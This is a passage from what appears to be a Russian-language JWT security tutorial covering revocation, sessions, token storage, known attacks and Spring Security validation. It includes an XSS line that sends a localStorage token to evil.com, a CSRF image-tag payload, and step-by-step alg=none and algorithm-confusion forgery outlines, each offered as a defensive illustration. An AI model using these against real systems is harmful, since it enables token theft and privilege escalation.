
При проверке RS сравнивает: `token_version` из JWT == `token_version` пользователя в БД?

При logout / password change / compromise — увеличиваем `token_version` пользователя. Все старые токены имеют старую версию → отвергаются.

```python
def validate_jwt(token):
    jwt = parse(token)
    verify_signature(jwt)
    verify_claims(jwt)
    
    user = db.get_user(jwt.sub)
    if jwt.token_version < user.token_version:
        raise TokenRevoked()
    
    return jwt

def logout_all_sessions(user_id):
    db.execute("UPDATE users SET token_version = token_version + 1 WHERE id = ?", user_id)
```

**Плюсы над blacklist**:
- **Не хранишь каждый jti** — одно поле per user.
- **User-level operations** — «logout everywhere», «revoke all sessions for user X» очень просто (+1 к версии).

**Минусы**:
- **Всё равно DB call на каждый запрос** — читать `token_version` пользователя. Можно кэшировать в Redis с коротким TTL (30 сек).
- **Не даёт selective revoke** — только всё или ничего для пользователя.

### Практический prod-подход: комбинация

Реальные системы часто используют all three:

1. **Access token — 5-15 минут TTL** — базовая защита. 99% сценариев решаются просто ожиданием expiration.
2. **Blacklist (jti в Redis)** — для срочного revoke (compromise). Пока не истечёт access.
3. **User-level version** — для logout everywhere, password change, employee termination.

Regular logout из одного устройства — просто клиент удаляет токен локально, ждём exp (< 15 мин).

Global logout — увеличить user's token_version + добавить refresh_token в blacklist.

## Session management при stateless JWT

Классические web-сессии — простые: session_id в cookie, session state на сервере, logout = удалить session на сервере.

С JWT — по-другому. Session становится концептом клиента, не сервера. Три паттерна.

### Sliding sessions

Session жива пока user активен. Не активен долго — session умирает.

**Механика**:
- Access token — 15 минут.
- Refresh token — 30 дней **от последнего использования** (не от выдачи).
- При каждом refresh — refresh_token rotation + reset TTL на 30 дней.

Если user активен (кликает раз в час) — токены обновляются, session живёт вечно. Не активен 30 дней — refresh_token истёк, надо relogin.

Хорош для UX — пользователь не выкидывается пока пользуется приложением.

### Absolute session timeout

Session умирает через фиксированное время от **выдачи** (независимо от активности).

**Механика**:
- Access token — 15 минут.
- Refresh token — максимум 30 дней от **выдачи**.
- Sliding не работает — TTL не переносится при refresh.

Через 30 дней от login — принудительный relogin. Стандарт для safety-critical (banking — 30 дней абсолютный лимит).

Комбинация с sliding: **sliding within absolute**. Sliding до N дней, но не больше absolute M дней (M > N). Например: sliding 7 дней, absolute 30 дней. Активный user — токены обновляются каждые 7 дней. Через 30 дней от login — relogin независимо от активности.

### Logout

С stateless JWT logout сложнее чем с cookies.

**Local logout** (простой):
- Клиент удаляет access_token и refresh_token из local storage.
- Пока access_token не истёк — технически всё ещё валиден на API. Пользователь не сможет использовать (у него нет токенов), но украденные (до logout) продолжают работать до exp.
- Приемлемо если access_token короткий (< 15 мин) и не sensitive операции.

**Server-side logout** (правильно):
- Клиент вызывает `/logout` endpoint AS.
- AS **инвалидирует refresh_token** (revoke в БД). Атакующий не сможет получить новые access.
- AS **добавляет access_token в blacklist** (если используется). Все RS сразу отвергают.
- Клиент удаляет токены локально.

**Global logout** (везде):
- AS увеличивает `token_version` пользователя.
- Все sessions пользователя (все девайсы) — токены становятся невалидны.
- Backchannel notification всем клиентам — они удаляют токены локально.

Keycloak поддерживает backchannel logout — регистрируешь URL, Keycloak посылает POST notification при logout.

## Хранение JWT на клиенте: XSS vs CSRF

Три варианта, каждый защищает от одних атак, уязвим к другим. Понимать trade-offs критично.

### 1. localStorage / sessionStorage (SPA)

Просто. `localStorage.setItem('access_token', token)`. Доступно из JavaScript.

**Attack vector — XSS**. Атакующий inject'ит JavaScript в страницу (через XSS уязвимость):
```javascript
// Injected malicious script
fetch('https://evil.com/steal?t=' + localStorage.getItem('access_token'))
```
Одна XSS уязвимость = **все токены пользователей compromised**.

**НЕ рекомендуется** для sensitive приложений. Sad but true — многие SPA всё равно так делают.

### 2. httpOnly cookie

Cookie с флагом `HttpOnly` — **недоступна JavaScript**, только автоматически прикрепляется браузером к запросам того же origin.

```
Set-Cookie: access_token=eyJ...; HttpOnly; Secure; SameSite=Strict; Path=/
```

Флаги:
- **`HttpOnly`** — JS не может прочитать.
- **`Secure`** — только через HTTPS.
- **`SameSite=Strict`** — не отправляется в cross-site requests (защита от CSRF).

**Attack vector — CSRF**. Cookie автоматически прикрепляется к запросам к myapp.com. Атакующий на evil.com делает:
```html
<img src="https://myapp.com/api/transfer?to=hacker&amount=1000" />
```
Браузер отправляет запрос с cookie. Если приложение не защищено от CSRF — операция выполняется от лица user.

Защита:
- **`SameSite=Strict`** — modern браузеры не отправляют cookie в cross-site запросах. Основная защита.
- **CSRF tokens** — приложение генерирует уникальный token per session, требует в headers/body. Атакующий не может подделать (не может прочитать cookie).

**Плюсы**:
- **XSS не поможет** — JS не читает.
- **Автоматическая отправка** — не нужно вручную добавлять headers.

**Минусы**:
- CSRF risk (митигируется SameSite + tokens).
- Ограничение same-origin — если API на другом домене (`api.myapp.com` vs `www.myapp.com`), сложнее.

### 3. Memory (JS variable)

Просто переменная в JS. Не сохраняется между page reload — надо refresh при каждом старте.

```javascript
let accessToken = null;

function setToken(t) { accessToken = t; }
function getToken() { return accessToken; }
```

**Плюсы**:
- **XSS сложнее** — атакующий не может прочитать переменную из injected script (разные scopes).
- Автоматически чистится при page close.

**Минусы**:
- **Пропадает при reload** — user перезагрузил страницу, всё, надо refresh с помощью refresh_token.
- Приемлемо для access_token (короткий, refresh автоматически), не для refresh_token.

### Best practice для SPA

Комбинация:
- **Refresh token в httpOnly cookie** — защита от XSS. При page reload — HTTP запрос automatically с cookie, backend возвращает новый access_token.
- **Access token в JS memory** — короткоживущий, XSS impact limited (максимум 15 мин).
- **CSRF token в meta tag** — защита от CSRF при refresh (и других API operations через cookie).

Реализация:
1. User логинится. Backend возвращает access_token в JSON body + refresh_token в Set-Cookie httpOnly.
2. SPA хранит access_token в JS переменной. Использует для API calls: `Authorization: Bearer <access>`.
3. Access истекает → SPA делает POST `/refresh` (без body). Cookie отправляется автоматически. Backend возвращает новый access + новый refresh (в новый Set-Cookie).
4. Page reload → JS переменная пустая → сразу POST `/refresh` для получения свежего access.

Этот паттерн — стандарт для secure SPA.

### Mobile (iOS/Android)

**iOS Keychain, Android Keystore** — encrypted storage OS. Доступ только приложению (изолировано от других apps через sandboxing).

Токены (access и refresh) — в secure storage. Стандарт для mobile.

Не в NSUserDefaults / SharedPreferences (unencrypted, backup'ится в облако).

## Security pitfalls: реальные атаки

### `alg=none` атака (CVE-2015-9235)

Классика. Старые библиотеки JWT принимали токен с `alg: none` как «не проверяем подпись». Атакующий:

1. Взял валидный JWT из чужого запроса.
2. Base64-декодировал header.
3. Изменил `alg: RS256` на `alg: none`.
4. Base64-декодировал payload.
5. Изменил `role: user` на `role: admin`.
6. Base64-encoded обратно.
7. Убрал signature (третья часть — пустая).
8. Отправил на сервер.

Уязвимая библиотека: видит `alg: none`, не проверяет подпись. Принимает токен как валидный. Атакующий получил admin.

**Реальная CVE** — множество библиотек были уязвимы. Node.js `jsonwebtoken` до 4.2.2, Java `nimbus-jose-jwt` до 4.36.1 и много других.

**Fix**: правильные библиотеки требуют явно указать whitelist разрешённых алгоритмов. Приняли `alg: none` только если явно в whitelist.

```java
// Правильно
JwtConsumer consumer = new JwtConsumerBuilder()
    .setJwsAlgorithmConstraints(
        AlgorithmConstraints.ConstraintType.PERMIT, 
        AlgorithmIdentifiers.RSA_USING_SHA256  // только RS256!
    )
    .build();
```

Spring Security делает это автоматически — принимает только настроенные алгоритмы.

### Algorithm confusion attack

Более тонкая атака. Сервер настроен для RS256 (asymmetric). Публичный ключ известен (например через JWKS endpoint).

Атакующий:
1. Скачивает публичный ключ сервера.
2. Создаёт JWT с `alg: HS256` (symmetric).
3. Подписывает **публичным ключом** сервера как секретом для HMAC.
4. Отправляет.

Уязвимая библиотека: видит `alg: HS256`, использует «сконфигурированный ключ» (публичный, но библиотека не знает) для HMAC-проверки. Проверка проходит.

**Проблема**: библиотека доверяет `alg` из header'а. Не должна — сервер знает какой алгоритм ожидает, не должен спрашивать header.

**Fix**: библиотеки должны требовать конкретный алгоритм для конкретного ключа. Не «попробуй проверить любым способом». Явное указание при валидации:

```java
// Правильно
Algorithm algorithm = Algorithm.RSA256(publicKey, null);
JWTVerifier verifier = JWT.require(algorithm).build();
```

Здесь связь ключ-алгоритм жёсткая. `alg: HS256` в JWT не сработает потому что verifier ожидает RSA.

Spring Security использует Nimbus JOSE JWT который тоже требует явного указания.

### Weak HS256 secrets

`secret = "password123"` — brute-force за минуты через специализированные tools (JohnTheRipper, hashcat).

Атакующий:
1. Получает валидный JWT (например через public register endpoint).
2. Пытается brute-force секрет — генерирует HMAC разных candidates, сравнивает с signature JWT.
3. Найден совпадающий → знает секрет → может подделывать любые JWT.

**Fix**: минимум **256 бит случайных данных**. Использовать crypto-secure random. Не человеческие пароли.

```bash
# Правильная генерация
openssl rand -base64 32
```

Хранить в secret manager (Vault, AWS Secrets Manager), не в git.

### Missing exp / aud / iss check

Библиотеки часто проверяют подпись автоматически. Но валидацию claims — часто НЕТ.

**Missing exp**: истёкший токен принимается. Атакующий использует украденный годовой давности токен.

**Missing aud**: токен для другого API проходит. Токен для app1 работает в app2.

**Missing iss**: токен от чужого AS может пройти если использует известный подписи алгоритм (algorithm confusion attack).

**Fix**: всегда после signature check явно проверять claims. Spring Security делает автоматически при правильной конфигурации через `issuer-uri`. Custom validators — на разработчике.

### JWT в URL

```
GET /api/orders?access_token=eyJ...
```

Проблема:
- **Browser history** — токен попадает в историю.
- **Server access logs** — nginx / Apache логируют URLs.
- **Referer headers** — при переходе на другой сайт токен уходит в Referer.
- **Analytics** — Google Analytics и подобные видят URLs.

**Fix**: только `Authorization: Bearer` header. Никогда query параметр.

Единственное исключение — WebSocket handshake (headers ограничены), там иногда query параметр приемлем. Но с осторожностью.

### Long-lived access tokens

Access_token на 30 дней. Украли — у атакующего месяц. Не помогает logout (JWT stateless, revoke сложно). Не помогает password change.

**Fix**: короткие access (5-60 мин) + refresh_token.

## Правильная валидация JWT: полный чек-лист

При получении JWT на RS проверить:

**1. Формат**:
- Ровно 3 части разделённые точками.
- Каждая — валидный base64URL.
- Первые две — валидный JSON после декодирования.

**2. Header**:
- `alg` — из whitelist разрешённых. **Никогда не `none`**.
- Соответствует ожидаемому алгоритму сервера.
- `kid` (если ротация) — известен в JWKS.

**3. Подпись**:
- Использовать правильный ключ (из JWKS по `kid` или configured).
- Использовать правильный алгоритм (соответствует ключу — RSA public key требует RS256/384/512, не HS256).
- Verify подпись header'а + payload'а.

**4. Claims**:
- `exp` — не в прошлом (можно с clock skew 30 сек).
- `iat` — не в будущем.
- `nbf` (если есть) — уже прошёл.
- `iss` — соответствует ожидаемому AS.
- `aud` — содержит my client_id.
- `sub` — есть (не пустой).

**5. Business validation** (задача приложения):
- Пользователь `sub` существует и активен в БД.
- Роли из claims allow'ены для запрашиваемого действия.
- `jti` не в blacklist (если revocation через blacklist реализовано).
- `token_version` из claim соответствует user's current в БД (если user-version revocation).

Spring Security делает шаги 1-4 автоматически при правильной конфигурации. Шаг 5 — задача бизнес-логики приложения.

## Spring Security JWT: как настраивается

Spring Security 6+ имеет полную поддержку JWT из коробки. Разберём поверхностно (детально — файл 120).

**Настройка Resource Server** для проверки JWT от Keycloak:

```yaml
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: https://keycloak.example.com/realms/myapp
```

Одна строка. Что делает Spring Boot:

1. При старте — HTTP GET `<issuer-uri>/.well-known/openid-configuration`.
2. Извлекает `jwks_uri` из ответа.
3. HTTP GET `<jwks_uri>` — скачивает JWKS.
4. Кэширует ключи с TTL (обычно 5 минут).
5. Настраивает `NimbusJwtDecoder` с валидаторами: подпись + iss (equals `issuer-uri`) + exp + iat + nbf.

При каждом запросе с `Authorization: Bearer <token>`:
1. Извлекает токен.
2. Парсит JWT.
3. Находит ключ в JWKS по `kid`.
4. Проверяет подпись.
5. Проверяет claims.
6. Успех → создаёт `JwtAuthenticationToken` в SecurityContext.
7. Failure → 401 Unauthorized.

**Что НЕ проверяется по умолчанию** — audience! Обязательно добавить в prod:

```java
@Bean
JwtDecoder jwtDecoder() {
    NimbusJwtDecoder decoder = JwtDecoders.fromIssuerLocation(issuerUri);
    OAuth2TokenValidator<Jwt> validator = new DelegatingOAuth2TokenValidator<>(
        JwtValidators.createDefaultWithIssuer(issuerUri),
        token -> {
            if (token.getAudience().contains(expectedAudience)) {
                return OAuth2TokenValidatorResult.success();
            }
            return OAuth2TokenValidatorResult.failure(
                new OAuth2Error("invalid_token", "Missing audience", null));
        }
    );
    decoder.setJwtValidator(validator);
    return decoder;
}
```

**Использование в контроллере**:

```java
@RestController
public class OrderController {
    
    @GetMapping("/api/orders")
    @PreAuthorize("hasAuthority('SCOPE_orders:read')")
    public List<Order> list(@AuthenticationPrincipal Jwt jwt) {
        String userId = jwt.getSubject();
        List<String> roles = jwt.getClaimAsStringList("realm_access.roles");
        return orderService.findByUser(userId);
    }
}
```

`@AuthenticationPrincipal Jwt jwt` — прямой доступ ко всем claims JWT. Типизированно.

## Заключение

**JWT** — компактный self-contained подписанный токен формата RFC 7519. Три части: **header** (алгоритм, kid) + **payload** (claims) + **signature**. Base64URL-encoded, разделены точками.

**Header НЕ секретен**, **payload НЕ секретен** — только подпись гарантирует что не подделан. Не класть в JWT приватные данные (пароли, банковские карты, зарплаты).

**Алгоритмы подписи**:
- **HS256** — HMAC-SHA256, симметричный. Один ключ везде. Быстро, просто. Приемлем только для одного сервера. **RS не должен иметь секрет** — но в HS256 имеет.
- **RS256** — RSA-SHA256, асимметричный. Приватный (AS подписывает) + публичный (RS проверяет). **Стандарт для OAuth**. RS не может подписывать. Публичный ключ безопасно раздаётся через JWKS.
- **ES256** — ECDSA-SHA256. Как RS256 но на эллиптических кривых. Меньшие ключи и подписи, быстрее. Modern choice.

**JWKS** — JSON Web Key Set. Endpoint AS отдающий публичные ключи. RS скачивает и кэширует. Key rotation — AS публикует старый + новый ключ одновременно на переходный период. Клиенты обновляют кэш автоматически при unknown `kid`.

**Standard claims** и от какой атаки защищает каждый:
- `iss` — от подмены AS.
- `sub` — уникальный ID user в контексте iss.
- `aud` — от использования токена для другого API.
- `exp` — от вечного использования украденного.
- `iat` — timestamp выдачи, для аудита.
- `nbf` — активация в будущем (редко).
- `jti` — уникальный ID токена, для blacklist revocation.

**Access vs Refresh Token**:
- **Access**: JWT (обычно), 5-60 мин, отправляется к RS каждый запрос, проверяется локально через JWKS.
- **Refresh**: часто opaque (не JWT), часы-месяцы, только к AS token endpoint, проверяется через lookup в БД.

**Refresh Token Rotation** — обязательный best practice. Каждое использование = новый refresh, старый инвалидируется. При краже — legit клиент попытается использовать «старый» refresh (свой сохранённый) → AS видит подозрение → terminate вся session. Атакующий получает максимум одну попытку.

**Revocation problem** — фундаментальная в stateless JWT. **3 решения**:
1. **Короткие access TTL** (5-15 мин) — просто ждать expiration. First line of defense.
2. **Blacklist по jti в Redis** — для срочного revoke (compromise). Мгновенно, но stateful + extra check на каждый запрос.
3. **User-level token_version** — one field per user in DB. Increment при logout everywhere / password change → все старые токены инвалидны.

Реальный prod = **комбинация всех трёх**.

**Session management**:
- **Sliding sessions** — TTL обновляется при активности. UX-friendly.
- **Absolute timeout** — максимум N дней от выдачи. Для sensitive systems.
- **Комбинация** — sliding within absolute (стандарт).
- **Logout**: local (клиент удаляет), server-side (revoke refresh + blacklist access), global (user-version + backchannel notification).

**Хранение на клиенте**:
- **SPA best practice**: refresh_token в **httpOnly cookie** (защита от XSS) + access_token в **JS memory** (короткоживущий, XSS impact limited) + **CSRF token** в meta tag для защиты refresh endpoint.
- **Mobile**: iOS Keychain / Android Keystore (encrypted, isolated).
- **Backend**: session в БД, JWT только для API calls.
- **НЕ**: localStorage (XSS-уязвим).

**Security pitfalls**:
- **`alg: none` атака** (CVE) — библиотека принимает токен без подписи. Fix: whitelist алгоритмов явно.
- **Algorithm confusion RS256↔HS256** — сервер должен требовать конкретный alg для конкретного ключа. Fix: explicit algorithm binding.
- **Weak HS256 secrets** — минимум 256 бит случайных. `openssl rand -base64 32`. В secret manager, не в git.
- **Missing exp/aud/iss check** — библиотеки часто не проверяют автоматически. Явно валидировать все claims.
- **JWT в URL** — попадает в history/logs/Referer. Только Authorization header.
- **Long-lived access tokens** — короткие + refresh_token.
- **XSS кража из localStorage** — httpOnly cookie для refresh.

**Правильная валидация**: формат → header (alg whitelist, kid) → signature (правильный ключ + правильный alg) → claims (exp, iat, nbf, iss, aud) → business (user active, roles allow, blacklist check).

**Spring Security 6+** — полная поддержка JWT из коробки. `spring.security.oauth2.resourceserver.jwt.issuer-uri` → автоматически discovery + JWKS с cache + validation подписи + iss + exp + iat. **Audience валидация — вручную обязательно**. Custom `JwtAuthenticationConverter` для extraction ролей Keycloak (`realm_access.roles`).

OAuth/OIDC протокол — файл 117. Keycloak реализация IDP — 119. Spring Security integration полностью — 120. Здесь была глубина по самому JWT: формат, подпись, безопасность, реальные атаки, revocation, session management, хранение.
